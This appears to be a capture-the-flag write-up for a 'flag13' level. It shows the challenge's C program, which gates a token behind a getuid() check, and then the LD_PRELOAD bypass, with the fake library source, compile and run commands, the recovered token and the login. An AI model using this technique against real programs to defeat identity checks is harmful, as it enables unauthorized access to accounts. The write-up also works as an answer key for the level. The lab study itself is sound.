@@ -1,0 +1,56 @@
+There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <string.h>
+
+#define FAKEUID 1000
+
+int main(int argc, char **argv, char **envp)
+{
+  int c;
+  char token[256];
+
+  if(getuid() != FAKEUID) {
+      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
+      printf("The system administrators will be notified of this violation\n");
+      exit(EXIT_FAILURE);
+  }
+
+  // snip, sorry :)
+
+  printf("your token is %s\n", token);
+  
+}
+
+
+After a bit of research I've found a possible vector of attack: LD_PRELOAD
+(source http://mips42.altervista.org/ld_preload.php)
+
+Basically, we have to create a library with getuid() function, that will return 1000. 
+Then we preload that library to make program call our function instead of expected one.
+
+Let's first create a library with our own getuid() function:
+lib.c
+
+int getuid() {
+	return 1000;
+}
+
+Now compile as shared library:
+> gcc -shared lib.c -o lib.so
+
+In order for this to work both library and executable must have the same owner.
+It's not a big deal since we have permission to execute (and copy) flag13.
+
+> cp /home/flag13/flag13 ~/
+> LD_PRELOAD=./lib.so ./flag13
+Your tokes is b705702b-76a8-42b0-8844-3adabbe5ac58
+
+Now log in:
+> login: flag13
+> password: b705702b-76a8-42b0-8844-3adabbe5ac58
+> getflag
+You have successfully executed getflag on a target account.
